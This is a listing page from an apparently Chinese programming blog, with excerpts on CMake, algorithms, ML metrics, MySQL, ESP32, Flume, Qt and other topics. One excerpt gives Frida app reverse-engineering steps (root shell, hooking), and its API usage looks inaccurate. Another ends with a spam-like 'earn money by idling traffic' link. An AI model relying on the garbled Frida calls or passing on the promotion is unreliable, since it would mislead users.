<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e4502b8f1d4a6ccb8a60ab523853e7de/" rel="bookmark">
			CMake自动导出dll导出符号
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CMake自动导出dll导出符号 对于Liunx和Unix平台，默认的c++模块都是以导出形式存在的，windows平台的导出需要声明__declspec(dlexport)进行导出，使用
__declspec(dllimport)进行导入，如果有一个静态库，现在想改成动态库，必须手动添加导出标志，除此，还有一个方法就是将导出信息，写入到*.def文件中，设置到编译器中。但这样都比较麻烦，正好CMake提供了自动生成def文件的功能。
1. 准备基础CMakeLists.txt和c++源文件： 1.1 c++源文件 1.1.1 DLL源码头文件 #include &lt;string&gt; class comm { public: static float sqrt(float v); float getValue(); void setValue(float v); private: float m_val; }; std::string GetSystemName(); 1.1.2 DLL源码cpp实现
#include "comm.h" float comm::s_val = 3.14f; float comm::sqrt(float v) { return v * v; } float comm::getValue() { return m_val; } void comm::setValue(float v) { m_val = v; } std::string GetSystemName() { static std::string info = "windows 10"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e4502b8f1d4a6ccb8a60ab523853e7de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ad7c57f6bad1201dfc48c256705d2a8/" rel="bookmark">
			最短路问题合集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 最短路问题是图论中很重要的问题，还有一个很重要的是拓扑排序。
最短路问题有很多应用，研究这个问题有相当的价值。
这里以题列举方法。选取了
leetcode743leetcode787 我的题解不以结构体等格式表示点，看了很多人的题解根本看不下去，其命名完全没有含义，由单个字母组成，不具备可读性。
在阅读这篇文章前，请确保你已经掌握对应的方法。如果没有，请到最下面的参考中学习，那是我看过的写的相对较好的几篇文章。
符号约定 graph : 或是邻接表或是邻接矩阵dist : 最短距离数组used : 已走过数组mmax : 最终结束距离最大值，若为 INF 则说明没走到i, j : 只是下标E : edge 表示边数 在分析性能时写成MV : vertex 表示点数 在分析性能时写成N 题目1： 有 n 个网络节点，标记为 1 到 n。
给你一个列表 times，表示信号经过 有向 边的传递时间。 times[i] = (ui, vi, wi)，其中 ui 是源节点，vi 是目标节点， wi 是一个信号从源节点传递到目标节点的时间。
现在，从某个节点 K 发出一个信号。需要多久才能使所有节点都收到信号？如果不能使所有节点收到信号，返回 -1 。
本题数据最大100，故选取 1e4 为 INF
方法1 朴素dijkstra 采用邻接矩阵存储
其中 mmin 的使用需要注意
class Solution { public: int networkDelayTime(vector&lt;vector&lt;int&gt;&gt;&amp; times, int n, int k) { vector&lt;vector&lt;int&gt;&gt; graph(n, vector&lt;int&gt;(n, 1e4)); for (auto &amp;x : times) { graph[x[0] - 1][x[1] - 1] = x[2]; } vector&lt;int&gt; dist(n, 1e4); vector&lt;bool&gt; used(n); int i, j; dist[k - 1] = 0; while (true) { int mmin = -1; for (i = 0; i &lt; n; ++i) { if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5ad7c57f6bad1201dfc48c256705d2a8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a0079e9fa64a1ca837ac47fd8013fce/" rel="bookmark">
			机器学习——基本概念
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何选择合适的模型评估指标？AUC、精准度、召回率、F1值都是什么？如何计算？有什么优缺点？ 选择合适的模型评估指标需要结合具体的问题场景，根据不同的需求来选择不同的指标。以下是几个常用的评估指标：
AUC（Area Under the ROC Curve）：ROC曲线下的面积，用于评估分类模型的性能。AUC的取值范围为0.5到1，AUC越接近1，说明模型性能越好。AUC计算方法是先计算出模型的ROC曲线，然后计算ROC曲线下的面积。
精准度（Precision）：正确预测为正例的样本数占预测为正例的样本总数的比例。精准度越高，说明模型的误判率越低。计算公式为：精准度 = TP / (TP + FP)。
召回率（Recall）：正确预测为正例的样本数占实际为正例的样本总数的比例。召回率越高，说明模型的漏判率越低。计算公式为：召回率 = TP / (TP + FN)。
F1值：综合考虑精准度和召回率的评估指标。F1值越高，说明模型的整体性能越好。计算公式为：F1值 = 2 * 精准度 * 召回率 / (精准度 + 召回率)。
这些评估指标各有优缺点：
AUC的优点是不受正负样本比例不均和分类阈值的影响，但它的缺点是无法直接解释分类器的表现情况。
精准度和召回率可以用于评估分类器的不同性能方面，但它们是互相矛盾的，提高一个指标会降低另一个指标。
F1值综合考虑了精准度和召回率的权衡，但是它也无法解决分类器的误判问题。
选择合适的评估指标需要根据具体的问题场景来确定，例如在医学诊断中，对于一些疾病的检测，需要提高召回率来减少漏诊的情况，而在广告推荐中，需要提高精准度来减少误判的情况。
回归模型和分类模型常用损失函数有哪些？各有什么优缺点 均方误差（Mean Squared Error，MSE）：对于回归模型来说，MSE是最常用的损失函数之一，计算预测值与实际值之间的平均差的平方。MSE的优点是容易计算和理解，但它对异常值比较敏感，可能会导致模型出现较大的偏差。
平均绝对误差（Mean Absolute Error，MAE）：也是回归模型中常用的损失函数，计算预测值与实际值之间的平均差的绝对值。相对于MSE，MAE更加鲁棒，对异常值不敏感，但是相对计算量较大。
交叉熵（Cross-entropy）：对于分类模型来说，交叉熵是常用的损失函数之一，特别是在二分类和多分类问题中。交叉熵测量了预测概率分布和真实标签的差距。它的优点是对于概率分布预测误差的惩罚比较明显，可用于处理多分类和不平衡分类问题，但是相对计算量较大。
对数损失（Logarithmic Loss，LogLoss）：也是二分类和多分类问题中常用的损失函数之一。对数损失计算了预测的概率分布与真实标签之间的负对数似然，可以用于评估分类器的准确性，但对于错误分类的惩罚较小。
Hinge损失：主要应用于支持向量机（SVM）的分类任务中，将预测结果与真实结果之间的差距转换为一个非线性的分类损失函数。Hinge损失可以将模型的输出空间分为正例和负例两部分，用于解决二分类问题，但它不适用于多分类问题。
总之，选择适当的损失函数可以帮助我们优化模型的性能。在选择损失函数时，需要考虑模型的特点、数据的特点和目标任务的要求。例如，在处理异常值较多的数据集时，可以选择MAE损失函数；在处理分类问题时，可以选择交叉熵或对数损失函数。
损失函数中 交叉熵 的介绍 交叉熵（Cross-entropy）是机器学习中常用的损失函数之一，特别是在分类任务中广泛应用。交叉熵测量了预测概率分布和真实标签之间的差距。在二分类问题中，交叉熵损失可以表示为：
在多分类问题中，交叉熵损失可以表示为：
ROC曲线如何绘制？相比P-R曲线有什么特点？ Precision-Recall曲线
P=TP/(TP+FP) ，P是代表预测为真且真实为真的数据占预测为真数据的比例。
R=TP/(TP+FN)，R是代表预测为真且真实为真的数据占真实为真数据的比例。
ROC:
横坐标为假阳率（False Positive Rate，FPR）
纵坐标为真阳率（True Positive Rate，TPR）
当正负样本的分布发生变化时，ROC曲线的形状能够基本保持不变，而P-R曲线的形状一般会发生较剧烈的变化。
损失函数是什么，如何定义合理的损失函数？为什么用这个损失函数？ 损失函数是机器学习模型中用于衡量预测值与真实值之间差异的函数。模型的目标是使损失函数尽可能小，以达到最优的预测效果。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a0079e9fa64a1ca837ac47fd8013fce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95c179295967d8193bbc663220fcbd23/" rel="bookmark">
			MySQL慢查询设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		查看慢查询是否开启：show variables like ‘slow_query_log’; 开启慢查询：set global slow_query_log=on;
显示慢查询时间：show variables like ‘long_query_time’; 设置慢查询时间：set global long_query_time=0.001; 设置后，退出重新登录查询。
设置慢查询日志文件保存位置：set global slow_query_log_file=”d:/mysql/log/slow.log” 查询慢查询日志保存位置：show variables like ‘slow_query_log_file’;
上述命令行修改无需重启就能生效，如果修改配置文件则需要重启才能生效。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57a294e6fd0dc97e68b21ec147c9f21d/" rel="bookmark">
			用ESP32&#43;Blinker完成寝室智能门锁以及寝室温湿度的反馈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		初始想法： 最初版的构思是通过ESP32板子连接学校的校园网，进而访问学校一个协会的服务器（仅在校园网或者协会WiFi能够连接上协会的服务器），使用服务器的Broker，以MQTT协议为基础，通过ArduinoIDE用C++对ESP32板子烧录程序，以达到物联网的效果（这里仅仅是想让这个东西可以开门就行）。 实际操作过程中遇到了两大问题：一、校园网的认证破解难度太高，学习周期偏长（需要从1700多行的JS语言中找到正确的JOSN数据包，并且加重了ESP32本身需要烧录的程序）；二、MQTTX在手机端操作麻烦。
想法更新： 经过查阅，了解到了Blinker这款应用，于是有了以下构思：
用ESP32直接连接互联网，并访问Blinker的MQTT Broker，同样以MQTT协议为基础，通过ArduinoIDE用C++给ESP32烧录程序，以实现物联网。
此方案解决问题的途径：一、对于访问MQTT Broker的问题，因为Blinker的服务器是公开的，可以用任何网络去访问。二、对于手机版运用复杂问题，BlinkerAPP提供了一款手机版的APP（适用于安卓、苹果），让手机版界面更便于操作和个性化。
此外，Blinker有许多可以现用的库函数，让项目内容得到了提升（给加入温湿度测量的提供了基础）。
开始实践： 一、ArduinoIDE环境搭建 ①ESP32开发板 关于Arduino的下载就不多赘述了，这里主要是想要分享一下关于在开发板管理器中添加ESP32时，在首选项里面关于网址的填写。
相信大多数人在首选项中用的Github上面的网址，下载的速度实在是太慢了，本人之前在开发ESP8266时也遇到过这样的问题。也在网上去寻找过许多方法，其实最简单的就是用这个网址：
https://arduino.me/packages/esp32.json
https://arduino.me/packages/esp8266.json(esp8266的也奉上)
当然，想要了解更多的可以自己去Arduino社区里看看，网址：https://arduino.me/home
②Blinker库、DHT库和ServoESP32库
我用的是这三个，当然你也可以用自己的。（这里需要注意的是ServoESP32库可能会和Servo库有冲突，后面代码大家可以自己看看想用哪一个，第一个完整的代码是没有用ServoESP32库的代码，里面关于pwm信号的计算在本文中不做介绍，第二个完整代码是用了ServoESP32库的）
二、手机下载Blinker 直接在手机浏览器上面搜索Blinker官网上面直接下载就行。
Blinker官网：https://diandeng.tech/home
三、硬件设施 主要包括：1个ESP32的板子、1个拓展板（注意和你手上板子的兼容性）、1个MG995舵机、1个DHT11温湿度传感器模块，3D打印配件（这个东西根据你们自己的需要去打印就行，这里就不过多介绍了），1个电源（来个充电宝就行）。
四、代码 完整代码：
直接给想要copy后，自己理解的UU们奉上。
未运用ESP32Servo库的代码： #define BLINKER_WIFI //宏定义，将ESP32的模式设置为WiFi模式 #include &lt;Blinker.h&gt; //Blinker库 #include &lt;DHT.h&gt;//包含DHT头文件 #define DHTPIN 4 //定义DHT11模块连接管脚也可以通过gpio去进行定义 #define DHTTYPE DHT11 // 使用温度湿度模块的类型为DHT11 char auth[] = "";//blinker上提供的密钥 char ssid1[] = "";//ESP32将连接的WiFi的名字 char pswd1[] = "";//ESP32将连接的WiFi的密码 int freq = 50; int channel = 8; int resolution = 8; int servo_max=180,servo_middle=90,servo_min=0; const int led = 16;//用于舵机控制的参数 BlinkerNumber HUMI("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57a294e6fd0dc97e68b21ec147c9f21d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aca9533109d0765644248d9f19025b89/" rel="bookmark">
			stm32f407创建一个工程后编译出现230个warning:macro redefined（文末链接包含其他创建工程模板时的错误解决方法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		创建一个stm32f407的工程模板后
删除了fmc.c
然后出现230个warning:macro redefined
解决方法:解除stm32f4xx.h只读属性
将warning的五行注释掉（重复定义了）
保存后恢复只读属性
编译后warning消失
下面链接包含其他错误解决方法
参考:https://www.cnblogs.com/Xubole2021/p/16824541.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63e678fbff82e2dd207331819fc8a4a3/" rel="bookmark">
			数据库管理系统的安装与心得
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于数据库这个概念我高中就有过接触，当时我们学的是什么是数据库、数据库管理系统、数据库系统.在数据库系统这门课刚开始上是，我本以为它会比其他功课容易接受，但是上了几节课之后，我发现这门课还是很难。因此，我就想到了把应用和课堂知识结合起来，可以帮助我学习这门功课。
我首先安装的是mysql。MySQL的安装对于我们来说还是比较容易的，可以直接在学习通课程资料的软件文件夹中找到mysql-5.5.62的安装包然后下载安装。
我们当然也可以在MySQL的官网上下载。在查找资料后发现官网提供了两种安装方式，一种是在线版联网安装，还有一种是本地安装。二者的区别是前者是联网安装，当安装时必须能访问互联网，后者是离线安装使用的，所以一般建议下载离线安装使用的版本。我是用老师的安装包下载的所以接下来我描述的都是安装包下载安装。
在安装包下载好后打开文件显示如下
接下来在点击接受之后再点击next按钮之后都是选择默认设定然后下一步。在设定数据库安装位置时可以选择C盘也可以选择自己想要的位置。然后下一步，在设置数据库可以链接的数量时就选择默认值15不需要改变。下一步时设置端口号，这个3306的端口号是默认的不需要修改。同时我们需要记住这个端口号，这个端口号在我们后续链接数据库时需要用到。
接下来继续下一步，这是需要注意，数据库在使用过程中会出现乱码，这是因为编码的问题。所以在这个界面我们需要选择utf8然后下一步就可以。
接下来时设置服务器名称，我们选择默认的MySQL即可，然后下一步。这时候就需要设置数据库的用户名和密码，因为以后要经常用，避免忘记，尽量不要设计太复杂。在输入完用户名和密码后直接点击下一步即可。
直接 点击执行就可以了。在等待一段时间后下面的会出现finish然后点击它结束安装即可。这时MySQL已经安装好了，我们就可以在我们的电脑里找到，点击MySQL的图标就可以连接到MySQL数据库，然后在页面中直接输入我们刚刚设定的密码，就会出现如下界面，这就表面我们的数据库安装成功。
接下来我安装的时是MS SQL Server数据库：
同样的我们可以在学习通的课程资料的软件文件夹中找到MS SQL Server数据库的下载地址。
下载这个文件打开，然后复制这个网页
SQL Server 下载 | Microsoft
需要注意的是我们需要选择Develop下载地址。
在下载好之后，打开安装程序，我们需要选择自定义安装。然后是选择安装路径，同样的我们可以选择我们习惯的路径也可以选择它的默认路径。然后就是等待安装了，这个过程比较缓慢，需要等待一会。在安装成功后会出现以下界面，然后选择安装：
点击第一个全新SQL Server。下一步是选择安装版本，选择默认的Develop就好不用修改，点击下一步。然后会出现许可条款，在点击我就受后点击下一步。然后是选择是否更新，这时候需要注意，这里不用点击，也就是不接受，直接点下一步就可以。接下来都是点击下一步，直到出现选择功能界面，我们需要点击全选：
然后点击下一步。接下来也都是点击下一步。在进入数据库引擎配置界面时，点击混合模式，输入自己设定的密码，再在下面点击“添加当前用户”，在信息导入之后点击下一步。
然后在Analysis Services配置中点击“添加当前用户”之后，选择表格模式，然后点击下一步即可。接下来都是直接选择默认，点击下一步。在Distracted Replay 控制器界面同样需要点击“添加当前用户”，然后点击下一步。然后是设置控制器名称，这个随便输入都行，在输完成后点击下一步。
在出现如下界面时，点击安装就可以了。
安装的时间会有点长，在安装完成后点击关闭就安装好了。
之后我们需要安装SSDT插件，这个插件的安装包同样可以直接在学习通课程资料的软件文件夹中找到。
在下载并安装后，SSMS就安装好了。
这时候我们的MS SQL Server数据库已经全部安装好了。然后我们在我们的电脑里找到SQL Server。并点击运行：
这时候我们需要链接服务器链接好后，数据库就可以使用了。
在安装的过程中我也遇到了许多问题。比如SSMS安装包始终无法安装，在同学的帮助下明白是360拦截，在设置它的拦截选项后，终于成功安装。没有什么事情是一帆风顺的，所以需要去想办法解决。利用好身边的资源，我相信，在以后的学习生活中，也要坚持这种态度，学习数据库系统。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0387e115007b19c57634a94e1180d70a/" rel="bookmark">
			# frida--App逆向笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		frida–App逆向笔记 常用基础 这些基础命令主要用于在Android设备上使用Frida进行逆向工程，下面是每个命令的解释： 1. `adb shell`：该命令用于通过ADB连接到Android设备的shell终端。 2. `su`：该命令用于获取root权限，这是许多逆向工程任务所必需的。 3. `cd /data/local/tmp`：该命令将当前目录更改为/data/local/tmp目录。通常，在此目录中存储Frida二进制文件和其他文件。 4. `./frida`：该命令用于启动Frida，它是一种动态插桩工具，可用于逆向工程和分析应用程序。 5. `adb forward tcp:27042 tcp:27042`和`adb forward tcp:27043 tcp:27043`：这些命令用于将设备上的TCP端口转发到本地计算机上，以便在使用Frida时进行通信。 run hook script ```bash 在Frida中，可以使用JavaScript编写钩子脚本来追踪函数调用并修改其行为。下面是一些常用的命令，以在目标设备上运行Frida钩子脚本： 1. 使用Frida客户端连接到目标设备：`frida -U [package name]` 2. 在Frida客户端中加载要注入的应用程序：`process = frida.get_usb_device().attach('[package name]')` 3. 定义要钩取的函数名称和参数数量：`function_name = "exampleFunction"; arg_num = 3;` 4. 定义回调函数，并在其中实现自定义逻辑：``` callback = function() { console.log("[*] " + function_name + "() called"); }; 5. 创建一个钩子对象：`hook = process.hook_function(Module.findExportByName(null, function_name), arg_num, callback);` 6. 运行应用程序并触发要钩取的函数：此时，您应该能够在控制台中看到钩子脚本输出。 找进程名和pid # 枚举所有的进程 processes = rdev.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0387e115007b19c57634a94e1180d70a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5714f8df4d9f431c1214a01125926d7e/" rel="bookmark">
			rk平台调试音频（从驱动到apk）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需要实现的功能：
输入：hdmiin、uvc、mic可以实时切换
输出：耳机和HDMI OUT同时输出声音
这里注意：mic是存在hedset情况，4节耳机，即可输出又可输出同时进行
开发情况：
一、先熟悉大致的Android的音频架构及流程：
1.apk想要录音，播音的接口：常用接口
AudioManager:音频管理器，包括音量管理、AudioFocus管理、音频设备管理、模式管理；
录音：AudioRecord、MediaRecorder；
播放：AudioTrack、MedaiPlayer、SoundPool、ToneGenerator;
编解码：MediaCodec，音视频数据 编解码接口。
2.JNI
与 android.media 关联的 JNI 代码会调用较低级别的原生代码来访问音频硬件。JNI 位于 frameworks/base/core/jni/ 和 frameworks/base/media/jni 中。
3.Native framework 原生框架
原生框架提供相当于 android.media 软件包的原生软件包，它调用 Binder IPC 代理来访问媒体服务器的音频专属服务。 原生框架代码位于 frameworks/av/media/libmedia 中。
原生框架代码位于 frameworks/av/media/libmedia 或frameworks/av/media/libaudioclient中（不同版本，位置有所改变）。
4.Binder IPC
Binder IPC 代理用于促进跨越进程边界的通信。代理位于 frameworks/av/media/libmedia 中，并以字母“I”开头。
5.Audio Server 媒体服务器
Audio系统在Android中负责音频方面的数据流传输和控制功能，也负责音频设备的管理。这个部分作为Android的Audio系统的输入/输出层次，一般负责播放PCM声音输出和从外部获取PCM声音，以及管理声音设备和设置（注意：解码功能不在这里实现，在android系统里音频视频的解码是opencore或stagefright完成的，在解码之后才调用音频系统的接口，创建音频流并播放）。Audio服务在Android N(7.0)之前存在于mediaserver中，Android N开始以audioserver形式存在，这些音频服务是与HAL 实现进行交互的实际代码。媒体服务器位于 frameworks/av/services/audioflinger 和frameworks/av/services/audiopolicy中。
6.Audio服务包含AudioFlinger 和AudioPolicyService：
AudioFlinger：主要负责音频流设备的管理以及音频流数据的处理传输，⾳量计算，重采样、混⾳、⾳效等。
AudioPolicyService:主要负责⾳频策略相关，⾳量调节⽣效，设备选择，⾳频通路选择等。
7.hal层
定义了音频服务会调用且您必须实现才能使音频硬件正常运行的标准接口。音频 HAL 接口位于 hardware/libhardware/include/hardware 中。详情可参阅 audio.h。对于不同的平台可能具体代码路径不一样，这里rk3588Android12平台hal层相关处理代码在 /hardware/rockchip/audio目录
8.内核声卡驱动程序
音频驱动程序用于同您的硬件和 HAL 实现进行交互。可以使用高级 Linux 声音架构 (ALSA)、开放声音系统 (OSS) 或自定义驱动程序（HAL 与驱动程序无关）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5714f8df4d9f431c1214a01125926d7e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2018795d7a0af5d765648dd9b7a06523/" rel="bookmark">
			java判断字符串（含中文）的内容相似度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		/** * 判断地址相似 * 此处简单的判断字符串的内容80%相似即可 * @param str1 * @param str2 * @return */ public static boolean isNearby(String str1, String str2) { Map&lt;Character, int[]&gt; vectorMap = new HashMap&lt;&gt;(); char[] chArray1 = str1.toCharArray(); for (char c : chArray1) { if (vectorMap.containsKey(c)) { vectorMap.get(c)[0]++; } else { int[] arr = new int[2]; arr[0] = 1; vectorMap.put(c, arr); } } char[] chArray2 = str2.toCharArray(); for (char c : chArray2) { if (vectorMap.containsKey(c)) { vectorMap.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2018795d7a0af5d765648dd9b7a06523/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80946a9c47f20bb81e375a79535e7c1f/" rel="bookmark">
			Flume 从入门到精通
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Flume Flume 是一种分布式、可靠且可用的服务 高效收集、聚合和移动大量日志 数据。
它具有基于流媒体的简单灵活的架构 数据流。它坚固耐用，容错，可靠性可调 机制以及许多故障转移和恢复机制。
它 使用允许在线分析的简单可扩展数据模型 应用。
系统要求 Java 运行时环境 - Java 1.8 或更高版本内存 - 为源、通道或接收器使用的配置提供足够的内存磁盘空间 - 为通道或接收器使用的配置提供足够的磁盘空间目录权限 - 代理使用的目录的读/写权限 数据流模型 创建软件存放目录 mkdir -p /opt/soft cd /opt/soft 下载安装包 wgt https://www.apache.org/dyn/closer.lua/flume/1.11.0/apache-flume-1.11.0-bin.tar.gz 解压安装包并改名 tar -zxvf apache-flume-1.11.0-bin.tar.gz mv apache-flume-1.11.0-bin.tar.gz flume 配置系统环境变量 vim /etc/profile export FLUME_HOME=/opt/soft/flume export PATH=$PATH:$FLUME_HOME/bin source /etc/profile printenv 创建配置文件目录 mkdir -p /opt/soft/flume-conf cd /opt/soft/flume-conf 采集网络数据 编写配置文件 vim netcat.conf # netcat.conf: 这是一个单节点flume配置 # 定义这个 agent 各个组件的名字 a1.sources = r1 a1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/80946a9c47f20bb81e375a79535e7c1f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd3aff1d1ca817dd272865787b224c4b/" rel="bookmark">
			PermissionError: [Errno 13] Permission denied:
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先说常规原因：
1、当前文件被占用了
2、用户没有访问权限
3、打开目标不是文件
在说非常规情况：
在使用函数 glob.glob 的时候，除了传入路径，还需要加上读取文件的占位符和格式，也就是下面的 *.png
glob.glob(r'D:\Py\OUT0_255\*.png') 另外，推荐一个挂机项目：流量挂机赚钱
文章链接：https://blog.csdn.net/qq_51338442/article/details/130490030
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/837420000f972eaa386bb215b3f61569/" rel="bookmark">
			华为机考题——HJ54 表达式求值（java）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HJ54 表达式求值（java） 描述
给定一个字符串描述的算术表达式，计算出结果值。
输入字符串长度不超过 100 ，合法的字符包括 ”+, -, *, /, (, )” ， ”0-9” 。
输入描述：
输入算术表达式
输出描述：
计算出结果值
实现思路 我的基本思路（仅供参考）：首先计算括号里面的表达式，每次分离出来括号内的内容单独计算，这样每次计算就仅仅是加减乘除的运算了；再其次，当括号内的内容计算完成后，将原有的表达式的括号部分替换成计算出来的值，直至所有括号内容全部被替换；因为不用考虑表达式是否合法的问题（括号匹配），那么将最后的表达式进行计算则可以得出结果。
需要注意：①判定括号的逻辑：是最后一个左括号和左括号后的第一个右括号，这里需要判定的是右括号的下标是否大于左括号，在代码25行处；②加减乘除运算优先级：乘除运算优先级要大于加减运算，我在此处给出的解决办法是：当遇到下一个运算符时，需要判定上一个运算符是否为’‘、’/‘运算，如果是，则需要先进行’‘、’/‘运算，将两个运算数取出做运算然后将结果放入栈，再遇到下一个运算符的时候，再判定当前的运算符是否为’‘or’/‘，这样最后最多只剩下一个’‘or’/‘运算，更好计算；③减法运算会得出负数：减法运算时，需要特殊处理，其一是因为结果可能为负数，其二是因为可能是两个负数相减，这里我的处理方法是，判定当前符号是否为’-‘，若是’-‘，那么我将’-x’一起存入栈，在最后做减法操作时，和前一个数相加，这样处理起来相较于直接运算更为便捷，不用再考虑复杂情况，但也因此，出现’-'运算符时还需考虑是否需要将该运算符入栈，判定条件为if (!cStack.size() == numStack.size() - 1 || !cStack.size() == numStack.size() - 2)，若剩余的运算符和运算数差值大于2，则需要该运算符，此时入栈，否则仅仅入栈两个运算数，在最后运算时，把仅存的两个运算数相加即可，不需要该运算符；④入栈出栈逻辑：如果没有遇到运算符，则在原来的字符串（若存在）后append该字符，当且仅当上一个运算数结束了才会遇到运算符时，则此时将存有数值的字符串转换成Integer类型并存入数值栈（numStack），若运算符栈（cStack）非空，则按照第②步运算逻辑根据在栈中的运算符（上一个运算符）运算。
上述代码可简化，分离括号逻辑可以重新在另一个函数中完成，主函数仅仅完成传输表达式和得出结果并替换字符串（若需要）的操作即可。
总之，代码很丑陋，思路很大众，大家做个参考，有更好的想法欢迎评论。
附上我未删注释的代码块：
代码（JAVA） import java.util.Scanner; import java.util.Stack; /* 描述 给定一个字符串描述的算术表达式，计算出结果值。 输入字符串长度不超过 100 ，合法的字符包括 ”+, -, *, /, (, )” ， ”0-9” 。 输入描述： 输入算术表达式 输出描述： 计算出结果值 */ public class Demo23ValueOfExpression { public static void main(String[] args) { Scanner in = new Scanner(System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/837420000f972eaa386bb215b3f61569/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d02c7aae5024938b7e459b8ed239d01/" rel="bookmark">
			2.5.1 QProgressBar 进度条
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2.5.1 QProgressBar 进度条 文章目录 2.5.1 QProgressBar 进度条前言一、示例QProgressBar类常用的成员函数 前言 QT 的 QProgressBar 类提供了一个水平和垂直样式的进度条。QProgressBar 通常用来给用户显示一个操作进度。比如：安装软件时显示的进度条、安装系统的进度条等等
提示：以下是本篇文章正文内容，下面案例可供参考
一、示例 进度条使用步骤：可以设置它的最小和最大值，通过 setValue()函数改变显示的百分比值。
#include&lt;QProgressBar&gt; QProgressBar *pro = new QProgressBar(this); pro-&gt;setValue(50); QProgressBar类常用的成员函数 1.设置对齐方式
Qt::Alignment	alignment() const void setAlignment(Qt::Alignment alignment) 常用的对齐方式：
Qt::AlignLeft：左对齐，百分比数字显示在进度条的结尾位置
Qt::AlignHCenter：中间对齐，百分比数字显示在进度条的中间位置
2.设置百分比显示格式
QString format() const	//获取当前显示的格式 void setFormat(const QString &amp; format)//设置显示的格式 void resetFormat()	//复位格式 格式语法：“%p"表示当前完成的百分比值，”%v“表示当前完成的百分比值（与%p一个意思），%m表示进度条百分比的最大值。
默认格式：“%p%‘’。如果当前进度条的值为50，显示的效果就是：50%。%p替换为50。
格式设置示例：
ui-&gt;progressBar-&gt;setFormat("当前速度：%pkm/h"); 3.设置最大最小值
int maximum() const void setMaximum(int maximum) int minimum() const void setMinimum(int minimum) void QProgressBar::setRange(int minimum, int maximum) //一次性设置最大最小值 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d02c7aae5024938b7e459b8ed239d01/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
